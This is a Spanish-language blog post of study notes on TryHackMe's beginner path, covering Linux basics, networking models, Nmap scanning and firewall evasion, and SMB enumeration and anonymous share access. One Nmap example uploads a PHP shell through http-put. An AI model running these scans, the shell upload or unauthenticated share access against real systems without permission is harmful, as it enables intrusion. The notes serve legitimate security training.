---
layout: post
title: 2.Complete Begginer path.
subtitle: Notes of the TryHackMe's path Complete Begginer.
tags: [thm]
---

## 0. Índice.
- 1 Linux Fundamentals.
	- 1.1. Fundamentos de Linux I.
	- 1.2. Fundamentos de Linux II.
	- 1.3. Fundamentos de Linux III.
- 2 Networking Explotation Basics.
	- 2.1. Introductory Networking.
	- 2.2. Nmap.
	- 2.3. Network Services.
- 3 Web Hacking Fundamentals.
- 4 Cryptography.
	- 4.1. Hashing - Crypto 101.
	- 4.2. John The Ripper.
	- 4.3. Encryption - Crypto 101.
- 5 Windows Explotation Basics.
	- 5.1. Windows Fundamentals I.
	- 5.2. Windows Fundamentals II.
	- 5.3. Active Directory Basics.
	- 5.4. Metasploit Introduction.
	- 5.5. Metasploit: Explotation.
	- 5.6 Metasploit: Meterpreter.
	- 5.7. Blue.
- 6 Shell & Privilege Escalation.
	- 6.1. Introducción a bind/reverse shell.
	- 6.2. Common Linux Privesc.
	- 6.3. Linux PrivEsc.
- 7 Basic computes explotation.
	- 7.1. Vulnversity.
	- 7.2. Basic Pentesting.
	- 7.3. Kenobi.
	- 7.4. Steel Mountain.
<br />

### 1. Linux Fundamentals

#### 1.1. Fundamentos de Linux I.

**Presentación**
Linux es un sistema operativo basado en UNIX, es de código abierto (libre de modificar por otros usuarios) y con una gran cantidad de "flavours" o versiones cada una con su propósito, ventajas y desventajas.

<br />

**Comandos importantes**

Existe una herramienta muy importante en cualquier sistema Linux denominada Terminal. Este es un programa que ejecuta comandos que se traducen en instrucciones del sistema operativo y con los que podemos utilizar el mismo sin límites.

Algunos de los comandos más importantes son:

|Nombre|Descripción|
|-|-|
|echo|Sacar por pantalla lo que se le pasa como argumento al comando.|
|whoami|Saca por pantalla el usuario actual de la máquina.|
|ls|Lista el contenido de la carpeta actual.|
|cd|Cambia de directorio al definido por la ruta que se le pasa al comando como argumento.|
|cat|Muestra el contenido del fichero que se le pasa como argumento.|
|pwd|Muestra la ruta desde la raíz hasta el directorio actual.|
|find|Busca un fichero en nombre de una especificación que puede ser el nombre, el tamaño del fichero, la carpeta a buscar, etc. Para más información, man find en la terminal.|
|grep|Filtra el output de un comando mediante un término u otras especificaciones. Para más información man grep.|

<br />

**Operadores**

Existen unos comandos que ejecutan instrucciones sobre el resultado de otros comandos comúnmente conocidos como *operadores*. Algunos de los más comunes son:

|Nombre|Descripción|
|-|-|
|&|Este operador manda a segundo plano el proceso iniciado por el comando a su izquierda.|
|&&|Este comando permite concatenar un segundo comando de forma independiente después de un primero.|
|>|Este comando redirige el outpu (que normalmente saldría por pantalla) a cualquier receptor de output indicado a su izquierda, por ejemplo un fichero.
|>>|Este comando hace lo mismo que el anterior pero lo hace sin sobreesribir, de forma que si redirijiéramos el output sobre un fichero, si este fichero contuviera algo escrito, no se borraría.|
|\||Este comando introduce el output del comando de la izquierda como input al comando de la derecha. Ejemplo: cat lista.txt \| grep teléfono|

<br />

#### 1.2. Fundamentos de Linux II.

NmapSSHTunneling.sh
También podemos conectarnos a una máquina Linux mediante SSH. SSH es un protocolo cryptográfico que posee una funcionalidad de administración remota que envía los datos cifrados.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220708184350.png' | relative_url }}" text-align="center"/>
</div>

Nos logeamos a una máquina remota en Linux con SSH mediante el siguiente comando:

```bash
ssh username@IPAdress
```

<br />

**Introducción a modificadores**

Muchos de los comandos admiten argumentos y opciones que modifican su comportamiento de una forma concreta. A estos argumentos especiales se les llama modificadores y suelen ir precedidos de uno o dos guiones. Por ejemplo, el comando "ls" que lista ficheros tiene el modificador 'a' que muestra los ficheros ocultos (aquellos cuyo nombre comienza con un punto)

```bash
ls -a
```

El comando anterior listaría los contenidos del directorio actual incluyendo aquellos ficheros ocultos, no mostrados por el "ls" convencional.

Para obtener una ayuda de los distintos modificadores que pdoemos aplicar a un comando tenemos generalemte el modificador "--help" o el comando "man \<comand>" que nos aportará además una pequeña descripción del comando. (Man responde a manual).

<br />

**Continuación de comandos importantes**

|Comando|Nombre completo|Descripción|
|-|-|-|
|touch|touch|Crear un fichero|
|mkdir|make directory|Crea un directorio (carpeta)|
|cp|copy|Copia un fichero (o un directorio con -r, recursively)|
|mv|move|Mueve un fichero o carpeta, renombrar|
|rm|remove|Borra un fichero o carpeta|
|file|file|Determina el tipo de contenido que contiene un fichero|
|su|su|Cambia al usuario especificado en el argumento.|
<br />

**Permisos**

Uno de los modificadores que exiten para el comando "ls" que lista el contenido de una carpeta es el '-l', que expone los detalles de los archivos listados:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220708204114.png' | relative_url }}" text-align="center"/>
</div>

Concretamente, nos interesa el dato proporcionado por la primera columna. Los permisos que los distintos usuarios del sistema tienen.

- Por un lado, estos se dividen en, el usuario propietario, el grupo propietario y otros.
- Por otro lado, los permisos se exponen con:
- r: read (permisos de lectura).
- w: escritura (permisos de escritura).
- x: execution (permisos de ejecución).

De forma que en el ejemplo anterior nos dice que ambos ficheros; file1, file2 son ficheros puesto que hay un guión al princpio de la línea (si fuera una carpeta sería una d), el propietario puede leer y escribir en el documento, el grupo puede leer y cualquier otro usuario puede solamente leer.

Debemos especificar que en linux, un usuario y un grupo no son más que dos ordenes de clasificación distintos, identificados por un "uid" (user id) y un "gid" (group id) respectivamente.

<br />

**Directorio más comunes**

- /etc -> Archivos de configuración.
- /var -> Archivos cuyo contenido varia o se actualiza constantemente, como los logs, etc.
- /root -> Directorio personal de usuario root.4

<br />

#### 1.3. Fundamentos de Linux III.

**Utilidades generales**

Existen un conjunto de comandos especialmente útiles:

- *wget*: Este comando permite descargar ficheros vis HTTP. Los ficheros puede abrirse con un navegador.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709094911.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *scp*: Permite enviar ficheros de un host a otro via SSH.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709100108.png' | relative_url }}" text-align="center"/>
</div>

Y para recuperarlo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709100143.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *curl*: Tiene el mismo propósito que curl

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709100654.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *WebServers*: Podemos montar un servidor web mediante el siguiente comando:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709100944.png' | relative_url }}" text-align="center"/>
</div>

De forma que desde otro sistema podría acceder a los archivos contenidos en nuestra máquina con wget:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709101223.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Procesos. Definición y manejo.**

Proceso es un término que alude a un programa en ejecución registrado y numerado por el sistema.

El usuario puede acceder a la forma en la que el sistema ordena los procesos mediante un conjutno de comandos, como ps que muestra los procesos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709165536.png' | relative_url }}" text-align="center"/>
</div>

top, que los muestra de una forma dinámica:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220709165537.png' | relative_url }}" text-align="center"/>
</div>

<br />

Con el fin de gestionar procesos tenemos el comando kill, que los termina. Para empezarlos tenemos los comandos *systemctl* o *service*. Por ejemplo: systemctl start apache2

Las opciones de systemctl son:

- start
- stop
- enable
- disable

Cuando se ejecuta un proceso podemos emplear las teclas Ctrl+C para pararlo, o Ctrl+Z para llevarlo a segundo plano y que no bloquee la terminal. También podemos devolverlo a primer plano con 'fg'.

<br />

**Automatización de procesos**

Para automatizar procesos podemos emplear *cron* que nos permite ajustar la hora y la periodicidad de ejecución de un proceso especificado concreto.

<br />

### 2. Networking Explotation Basics.
En esta sección vamos a hacer un repaso general del Computing Networking y seguidamente vamos a explorar algunos de los comandos de manteniemiento y gestión de red más utilizados.

<br />

#### 2.1. Introductory Networking.

**The OSI model**

El modelo OSI (Open Syetem Interconnection), es un modelo estándard que pretende teorizar cómo funciona el intermcambio de datos entre dos dispositivos. Un derivado del modelo OSI que se acerca más a la realidad es el TCP/IP model.

Este consta de 7 campos o capas de abstracción, los datos atraviesan cada una de las capas adheriéndose datos que contienen información relativa al tratamiento de los mismos dependiente de cada capa (encapsulamiento).

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220711164725.png' | relative_url }}" text-align="center"/>
</div>

De forma que, muy brevemente:

- Layer 7 - Application: Proporciona una interfaz a una aplicación ejecutándose como un proceso en un sistema para que esta envíe datos.

- Layer 6 - Presentation: Esta capa recibe el dato de la capa de aplicación y lo traduce sobre un estándard de forma que pueda ser leído por cualquier aplicación que se ejecute en la máquina receptora.

- Layer 5 - Session: La capa de sesión se encarga de abrir y mantener una sesión con la otra máquina. Recordamos que una sesión es una conexión satisfactoria entre dos dispositivos.

- Layer 4 - Transport: La capa de transporte recibe los datos de la capa de sesión y decide en qué protocolo de transporte (TCP o UDP) será enviado los datos. Acto seguido estos datos son divididos en trozos más pequeños (segmentos en TCP, datagramas en UDP).

- Layer 3 - Network: La capa de Network es responsable de encontrar la localización de la máquina de destino receptora de la request. Para ello, se añaden las cabeceras IP.

- Layer 2 - Data Link: Se encarga del direccionamiento físico del paquete. Recibe el mismo de la capa de network que contiene la dirección IP y le añade la dirección MAC.

Además, tiene la importante función de checkear que los datos no se hallan corrompido durante la transmisión.

Además, la información se formatea para transmitirla.

- Layer 1 - Physical: Esta capa añade al paquete información acerca de por dónde va a ir el mismo. Y envía o recibe el paquete.

<br />

#### 2.2. Encapsulación.

Como hemos indicado antes, la encapsulación es el proceso por el que se le añaden datos a un paquete relativo a cada capa del modelo OSI para ser enviado y recibido correctamente:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220711171905.png' | relative_url }}" text-align="center"/>
</div>

Observemos que conforme el paquete avanza por las distintas capas va acumulando cabeceras y el paquete total se va denominando de formas distintas. Una vez sale del emisor y llega al receptor, el paquete se desencapsula y su información se procesa para llevar a cabo una buena lectura del contenido del paquete.

<br />

#### 2.3. The TCP/IP model.

El modelo TCP/IP es un derivado del modelo OSI que se adecua más a un escenario real de intercambio de datos entre dispositivos. Este consta de cuatro capas: Application, Transport, Internet & Network Interface.

(Alguna teoría reciente cambia la capa Network Interface por Data Link y Physical layers).

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220711172724.png' | relative_url }}" text-align="center"/>
</div>

Ambos modelos coinciden de la siguiente forma:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220711173027.png' | relative_url }}" text-align="center"/>
</div>

De forma que el procesamiento de los datos (encapsulamiento y de-encapsulamiento) funciona igual en ambos casos. Es conveniente recordar que el modelo TCP/IP emplea los protocolos TCP e IP, a su vez el modelo TCP es un connection-based protocol que abre una conexión mediante un Three-way handshaking TCP

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220711173245.png' | relative_url }}" text-align="center"/>
</div>

Antes de comenzar a mandar información y cierra la conexión antes de terminar.

En TCP, todo paquete o segmento envíado al otro ordenador tiene como respuesta su ACK (acknowledge) antes de enviar otro dato.

<br />

**Networking Tools**

En esta sección, vamos a ver algunos de los comandos más importantes para testear y manejar la red:

- **Ping**: Ping es un comando empleado cuando se desea testear si una conexión a una fuente remota es posible.

Ping opera sobre el protocolo ICMP, protocolo de la capa de red en el modelo OSI o la capa de Internet en el modelo TCP/IP.

La sintaxis adecuada es:

```bash
ping <target>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220711175415.png' | relative_url }}" text-align="center"/>
</div>


Además es importante observar que la IP devuelta no es la URL empleada como target, sino la IP del servidor que hostea la aplicación web. Esta es una aplicación secundaria del comando ping, conocer la IP del servidor que hostea una aplicación.

Para más información: man ping en linux.

<br />

- **Traceroute**:

Traceroute es un comando cuyo propósito es ser una extensión del comando 'ping'.

Internet es una basta red compuesta por múltiples nodos y aristas, es decir, con múltiples servidores (end-points) e interconexiones. Esto significa que a la hora de conectarnos con un host, es más que probable que pasemos a través de una gran cantidad de servidores antes de llegar a nuestro destino.

Traceroute permite ver cada una de esas conexiones:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220711180649.png' | relative_url }}" text-align="center"/>
</div>

(En Windows, el comando es tracert). Para más información, man traceroute en linux.

<br />

- **WHOIS**

Como recordaremos, para acceder a ciertos servicios en Internet empleamos en lugar de una IP, un dominio. WHOIS por su parte es un comando que nos permite buscar a quién está asociado un dominio concreto.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220711181430.png' | relative_url }}" text-align="center"/>
</div>

Existe una versión de web pero también como comando, cuya sintaxis es:

```bash
whois <domain>
```

<br />

- **Dig**

Dig es un comando que nos permite llevar a cabo manualmente consultas sobre servidores DNS acerca de un dominio concreto.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220711182654.png' | relative_url }}" text-align="center"/>
</div>

Tiene la siguiente sintaxis:

```bash
dig <domain> @<dns-server-ip>
```

A grandes rasgos, para acceder a un servicio web multitud de veces en lugar de teclear la IP del servidor que hostea la aplicación empleamos un dominio, un nombre.

Lo que hacemos es realizar una request a un servidor DNS que cambia el dominio empleado por la IP de la máquina de destino para que nuestra request llegue correctamente. Aunque esto se hace automáticamente, Dig nos permite llevar a cabo una consulta manual.

Un aspecto importante de Dig es que nos aporta el TTL de una respuesta almacenada en el DNS cache:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220711183100.png' | relative_url }}" text-align="center"/>
</div>

La respuesta se muestra en segundos.

<br />

#### 2.2. Nmap.

**Introducción a NmapSSHTunneling.sh

Nmap es una herramienta de portscanning muy potente. Lleva a cabo peticiones en batería para descubrir el estado de cada uno de los puertos de una determinada máquina.

Recordamos que los puertos son las utilidades que se emplean para regular la entrada y salida de tráfico de una máquina. Detrás de cada puerto hay una aplicación escuchando o enviando información.

Hay un total de 65535 puertos, de los cuales 1024 están asociados a un servicio (que no aplicación) concreto.

Si Nmap encuentra un puerto abierto lo comunica e intenta recopilar la máxima información posible acerca de la aplicación que hay detrás, etc.

<br />

**Modificadores de NmapSSHTunneling.sh

Nmap, como la mayoría de las herramientas de pentesting, se ejecuta desde la terminal, mediante "nmap".

Existen algunos modificadores importantes acerca de nmap, por ejemplo el '-h' que nos da ayuda sobre cómo utilizar el comando y sus distintas opciones.

|Nombre|Descripción|
|-|-|
|-sS|SynScan|
|-sU|UDP scan|
|-O|Operating system detecting.|
|-sV|Version detection|
|-v|Verbose|
|-vv|Increased verbose|
|-oA|Guardar resultados en tres grandes formatos.|
|-oN|Guardar resultado en formato normal.|
|-oG|Guardar resultados en formato grepeable.|
|-A|Detección de sistema operativo, servicio, traceroute, etc.|
|-T<1-5>|Rapidez del escaneo.|
|-p \<numero>|Escanear sólo ese puerto.|
|-p <nºinicial-nºfinal>|Escanear ese rango de puertos.|
|-p-|Escanear todos los puertos.|
|--script=nombredelscript|Empleo de un script.|

<br />

**Tipos de escaneos**

Cuando empleamos Nmap para hacer un port scannig podemos hacer básicamente tres tipos de escaneos:

- TCP Connect Scans (-sT): Hace una petición TCP completa.
- SYN "Half-open" (-sS): Hace una petición TCP enviando un SYN y esperando su SYN/ACK pero no devolviendo un ACK.
- UDP Scans (-sU): Envía un paquete UDP.

Existen escaneos menos comunes:

- TCP Null Scan: Este se basa en enviar paquetes TCP sin flags en el encabezado del paquete constryéndo paquetes "ilegales" los cuales se manejan de distinta manera.

- TCP FIN Scan: Se envían paquetes FIN de TCP HandShake para comprobar si están cerrados.

- TCP Xmas Scan: Este es el caso contrario al NULL, se envían paquetes TCP con todas las posibles flags de forma que se genera un paquete ilegal en otro sentido y por tanto, se gestiona de forma distinta.

- ICMP Scan: Se envía un paquete ICMP.

Estos tipos de escaneos están estrechemante vinculados a cómo una máquina gestiona cierto tipos de paquetes gracias al **RFC o Request For Comments**, una publicación de desarrollo técnico que asienta un conjunto de estándares relacionados con la metodología, protocolos, etc en Internet y otras disciplinas.

<br />

**TCP Connect Scans**

Para entender el TCP Connect Scans hay que tener relativamente claro el *TCP three-way handshake*. Este no es más que un procedimiento que formaliza la conexión entre dos dispositivos que se comunican por TCP. Consta de tres pasos un SYN que el cliente envía para abrir la conexión, un SYN/ACK que el servidor devuelve dando a entender que le ha llegado la petición y que acepta la conexión y seguidamente el cliente envía un último ACK a modo e confirmación.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712095105.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712095115.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, el Nmap TCP Connect Scan es un escaneo por el que Nmap intenta conectarse mediante el three-way handshake

- Si este anlece se produce, Nmap determina que el puerto está abierto.
- Si el puerto estuviera cerrado (esto es, que no hay ninguna aplicación escuchando), por el RFC 793, el puerto devuelve un RST (reset) y Nmap determina que el puerto está cerrado.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712095748.png' | relative_url }}" text-align="center"/>
</div>

- Puede ocurrir una tercera opción, que el puerto esté oculto detrás de un Firewall. En dicho caso, Nmap enviará un paquete y el firewall lo interceptará y lo desechará. Nmap no recibirá un paquete de vuelta y catalogará al puerto como *filtered*.

Sin embargo, es importante resaltar que se puede configurar un firewall para que devuelva un RST:

```bash
iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset
```

<br />

**SYN Scans**

El escaneo SYN, al igual que el TCP connect, sirve para llevar a cabo un descubrimiento de puertos en una máquina pero de una forma ligeramente distinta.

A este tipo de escaneo se le denomina con frecuencia "Half-open" (medio abierto) o escaneo sigiloso.

En este caso, el cliente lanza un SYN y cuando le devuelven un SYN/ACK en lugar de devolver otro ACK, devuelve un RST (fundamentalmente para prevenir al servidor de intentar hacer una conexión).

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712101011.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712101019.png' | relative_url }}" text-align="center"/>
</div>

Esto contiene una serie de ventajas:

- Se puede utilizar para eludir los sistemas de detección de intrusos más antiguos, ya que estos buscan un three-way handshake completo. A menudo, este ya no es el caso con las soluciones IDS modernas; es por esta razón que los escaneos SYN todavía se conocen con frecuencia como escaneos "sigilosos".

- SYN scans no son registrados (not logged) por las aplicaciones que escuchan en un puerto abierto. Por tanto es más difilil dejar rastro con el SYN scan.

- SYN scan no se preocupa de completar o no el tcp handshaking, por tanto, es más rápido que el TCP connect convencional.

Por estas razones, el SYN scan es el escaneo por defecto de Nmap cuando se ejecuta como super usuario (sudo, sino el SYN scan no puede ser utilizado). Si no, el escaneo por defecto es TCP scan.

Para el resto de situaciones el SYN scan emplea las mismas directrices que el TCP connect (puertos cerrados o filtrados).

<br />

**UDP Scans**

A diferencia de TCP, las conexiones UDP son *stateless* y no precisan de la formalización de una conexión.
Los paquetes UDP se envían y simplemente se espera que lleguen a su destino. Esto vuelve las conexiones más rápidas, pero en lo relativo a los escaneos es más dificil y más lento.

Cuando un paquete se manda a un puerto UDP, no debería de haber respuesta, en dicho caso Nmap cataloga el puerto como *open|filtered*, esto es; que el puerto podría estar abierto pero también podría estar cubierto por un firewall. (Sólo si se recibe una respuesta UDP, las menos de las veces, se cataloga un puerto como abierto).

Cuando el puerto UDP está cerrado responderá con un paquete ICMP dejando claro que el puerto no está disponible. Así, Nmap lo cataloga como cerrado y continua.

Debido a que el escaneo UDP es muy lento, lo más aconsejable es escanear un número fijo de puertos:

```bash
nmap -sU --top-ports 20 <target>
```

<br />

**NULL, FIN, and Xmas**

Son escaneos poco comunes y por tanto no indagaremos tanto como en los casos anteriores.

- *NULL Scan*: (-sN). Lo que hacemos es mandar paquetes TCP sin flags. Por el RFC, si el puerto está cerrado debería de responder con un RST.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712131018.png' | relative_url }}" text-align="center"/>
</div>

- *FIN Scan*: (-sF). Funciona como el NULL Scan, sólo que en lugar todos los flags vacío se envía el FIN y de nuevo, Nmap espera un RST si el puerto está cerrado.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712131717.png' | relative_url }}" text-align="center"/>
</div>

- *Xmas scan*: (-sX), funciona como todos los anteriores pero envía un paquete TCP con los flags: PSH, URG, FIN, puestos. Se trata de un paquete malformado que espera por respuesta un RST.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712132033.png' | relative_url }}" text-align="center"/>
</div>

La respuesta esperada para puertos abiertos con estos escaneos también es idéntica y es muy similar a la de un escaneo UDP: Si el puerto está abierto, no hay respuesta al paquete con formato incorrecto, desafortunadamente (al igual que con los puertos UDP abiertos), ese también es un comportamiento esperado si el puerto está protegido por un firewall, por lo que los escaneos NULL, FIN y Xmas solo identificarán los puertos como *open|filtered*, *closed* o *filtered*. Si un puerto se identifica como filtrado con uno de estos escaneos, generalmente se debe a que el destino ha respondido con un paquete ICMP "unreachable".

El objeto de todos estos tipos de escaneos es el de saltarse un posible Firewall. Muchos firewalls están diseñados para deshechar paquetes con la flag SYN, sin embargo, si lleguase un paquete que no contiene ese flag lo dejaría pasar y la respuesta nos permitiría obtener información.

<br />

**ICMP Network Scanning**

En el caso de que estuviéramos asaltando una red, querríamos saber qué IPs están asociadas a hosts activos y cuáles no. (Recordamos que una IP contiene esencialmente una parte fija que identifica a la red y una parte variable que varía en cada dispositivo, aquí juega un papel muy importante la máscara de red que determina la amplitud de ambas partes sobre la propia IP).

Una forma de hacer esto es usando Nmap para realizar el llamado "barrido de ping". Para realizar un barrido de Ping Nmap envía un paquete ICMP a cada dirección asociada a un host en la red y marca cada dirección como activa cuando alguna dirección responde al paquete ICMP.

Para llevarlo a cabo empleamos el modificador -sn:

```bash
nmap -sn 192.168.0.1-254
```

o

```bash
nmap -sn 192.168.0.0/24
```

En el primero indicamos el rango y en el segundo la máscara de red. Recordamos que a máscara de red define lo grande que es la parte fija de la IP en este caso sólo el último octeto se deja como parte libre. Con máscara 16 se dejarían los dos últimos octetos y así.

Además conviene indicar que el -sn previene que nmap escane ningún puerto para que sólo se centre en identificar los dispositivos. Si no emplearamos este modificador nmap 192.168.0.0/24, haría un escaneo de red y un escaneo de puertos de los dispositivos que encontrara activos.

<br />

**NSE Scripts**

El NSE son siglas que responden a Nmap Scripting Engine y se trata de una poderosa adición a Nmap extendiendo su funcionalidad considerablemente.

Los NSE Scripts están escritos en *Lua* y se emplean para una gran cantidad de propósitos. Entre las categorias de cada script se encuentran:

- *safe*: No afecta al target.
- *intrusive*: Probablemente afecte al target.
- *vuln*: Escaneo de vulnerabilidades.
- *exploit*: Intento de explotación de una vulnerabilidad.
- *auth*: Intenta hacer un bypass a la autenticación (logearse en ftp de forma anónima, en Mysql con root:, etc)
- *brute*: Bruteforce credentials.
- *discovery*: Intenta buscar servicios en ejecución para recopilar información sobre la network.

<br />

**Trabajando con el NSE**

Para invocar un script con Nmap lo que hacemos es utilizar el flag: --script.

```bash
nmap --script=<scriptname> IP
```

Aunque pueden correrse varios de una vez:

```bash
nmap --script=<script1>,<script2>... IP
```

Ese sería un ejemplo de como emplear un script, pero también podemos pedir que utilice todos los scripts pertenecientes a una categoría concreta:

```bash
nmap --script=safe
```

Algunos scripts requieren de argumentos, para ello empleamos el --script-args, por ejemplo:

```bash
nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'
```

Como puede verse, primero se llama al script y luego se invoca el flag para añadir los argumentos, cada argumento tendrá la forma de: *script-name.arg=\<value>* y cada uno de los argumentos estan separados por comas.

Además, los scripts de Nmap vienen con un menú de ayuda incluido: *nmap --script-help \<script-name>*.

<br />

**Firewall Evasion**

Aunque ya hemos visto que algunos tipos de escaneos nos permiten llevar a cabo un bypass de algunos Firewalls como el Xmas, Null, FIN. Sin emabrgo, Windows contiene una configuración de firewall muy importante que debemos saber cómo bypassear.

Típicamente, el firewall desecha también todos los paquetes ICMP, esto provoca que una máquina Windows activa resulte invisible en un barrido Nmap.

Sin embargo, Nmap posee una opción, '-Pn' que hará que Nmap trate a un host como si estuviera activo llevando a cabo un bypass del ICMP block.

<br />

### 3. Network Services.

#### 3.1. SMB.

**Entendiendo SMB**

SMB son las siglas de Server Message Block, y se trata de un protcolo de comunicación cliente-servidor empleado para compartir acceso a ficheros y otros recursos en red. Tales recursos reciben el nombre de *SMB shares*. Concretamente:

Un share o recurso compartido, es un recurso local en un servidor al que pueden acceder los clientes SMB en la red. Para el servidor SMB, un recurso compartido suele ser un directorio. El acceso a estos puede estar restringido.

El protocolo SMB es un protocolo "response-request", que intercambia un conjunto de datos en orden de establecer una conexión entre el cliente y el servidor. Opera originalmente sobre el puerto 139 con NetBIOS que es un protocolo de transporte antiguo. Las máquinas más modernas emplean el puerto 445 con TCP stack.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712164825.png' | relative_url }}" text-align="center"/>
</div>

Una vez que se ha establecido una conexión, el cliente envía comandos (SMBs) al servidor que le permite acceder a sus datos / recursos.

SMB es un servicio que corre en Windows exclusivamente. Por su parte, Samba es un servicio de código abierto disponible para sistemas Unix.

<br />

**Enumerando SMB. Enum4Linux.**

La enumeración es el proceso de recopilación de información sobre un objetivo para encontrar posibles vectores de ataque. En él se recopilan credenciales, información de la red, hostnames y en general todo tipo de información. En muchos casos, en los servidores SMB existen datos compartidos que pueden contener información sensible de un sistema.

Otras herramientas útiles sobre la enumeración es el **Port Scanning**, **Enum4Linux**; una herramienta empleada enumerar SMB Shares tanto en Windows como en Linux, se puede instalar desde: https://github.com/CiscoCXSecurity/enum4linux

La sintaxis es sencilla:

```bash
enum4linux [options] IP
```

Entre las distintas opciones podemos encontrar:

|Nombre|Descripción|
|-|-|
|-U|get user list|
|-M|get machine list|
|-N|get namelist dump|
|-S|get sharedlist|
|-P|get passwordpolicy information|
|-G|get group and member list|
|-a|Todas las anteriores.|

Pongámos esto en práctica mediante el asalto de una máquina:

- En primer lugar llevamos a cabo un escaneo de puertos con Nmap

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712174436.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que existen dos puertos abiertos detrás de los cuales existen dos aplicaciones; NetBios-ssn y Microsoft-ds, las cuales son aplicaciones de enlace de una apliación con Hardware específico. Haciendo un escaneo más profundo (-sV, obtener las versiones) alcanzamos a ver las versiones de los servicios constatando que en ambos casos se tratan de servidores SMB:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712175128.png' | relative_url }}" text-align="center"/>
</div>

<br />

- Ahora, pasamos a emplear la herramienta Enum4Linux, la obtenemos de Github

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712181738.png' | relative_url }}" text-align="center"/>
</div>

Accedemos al directorio en el que se ha clonado

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712181813.png' | relative_url }}" text-align="center"/>
</div>

Le damos permisos al script para que pueda ejecutarse (chmod +x enum4linux.pl) y lo ejecutamos sin parámetros, tendremos acceso a un menú sobre cómo lanzar el script:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712182144.png' | relative_url }}" text-align="center"/>
</div>

Dado que nosotros lo que pretendemos es hacer una enumeración del servicio, corremos el script sólo añadiendo la IP de destino. Para poder localizar rápidamente palabras clave envíamos el output a un fichero:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712182443.png' | relative_url }}" text-align="center"/>
</div>

Y luego sacamos el contenido y lo filtramos con 'grep' para buscar términos específicos como usernames, passwords, workgroups:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712182546.png' | relative_url }}" text-align="center"/>
</div>

Aunque también podemos obtener la información del output directo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712182956.png' | relative_url }}" text-align="center"/>
</div>

<br />

**SMB Exploiting**

El *exploiting* es el proceso de ejecutar un mecanismo con el que podamos sacar provecho de una vulnerabilidad.

En lo referente a SMB, existen exploits concretos de vulnerabilidades documentadas: CVE-2017-7494. Sin embargo, en la mayoría de las ocasiones lo mejor es aprovecharte de pequeñas mal configuraciones en el sistema.

Vamos a continuar el ejemplo anterior intentar explotar un SMB share mediante una malconfiguración común.

Antes de continuar, dado que estamos intetando acceder a un recurso SMB compartido (SMB Share), necesitamos un cliente de SMB (recordamos que este es un protocolo cliente-servidor). Para ello empleamos el SMBCliente que es parte de la suite de Samba (Interfaz SMB para Unix).

El SMBClient nos da acceso a los distintos shares que pueda haber en un servidor SMB y nos permite acceder a los distintos contenidos en los 'shares'.
Para utilizarlo empleamos la sintaxis:

```bash
smbclient //<IP>/<share>
```

Existen modificadores -U para especificar el usuario, -p para especificar el puerto. Así, para acceder al SMB share "secret" de una máquian 10.10.10.2 con el usuario suit, emplearíamos el comando:

```bash
smbclient //10.10.10.2/secret -U suit
```

Así, volviendo al ejemplo anterior, sabemos que existe un share interesante que podemos investigar: profiles

Así, probamos a intentar acceder sin contraseña mediante el usuario Anonymous:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712190109.png' | relative_url }}" text-align="center"/>
</div>

Y comprobamos que tenemos acceso. Ahora, lo que tenemos es una SMB Shell, sobre los comandos que podemos ejecutar en esta shell podemos obtener información aquí: https://www.samba.org/samba/docs/current/man-html/smbclient.1.html

Podemos listar los contenidos del directorio en el que nos encontramos:

<div style="text-align:center">
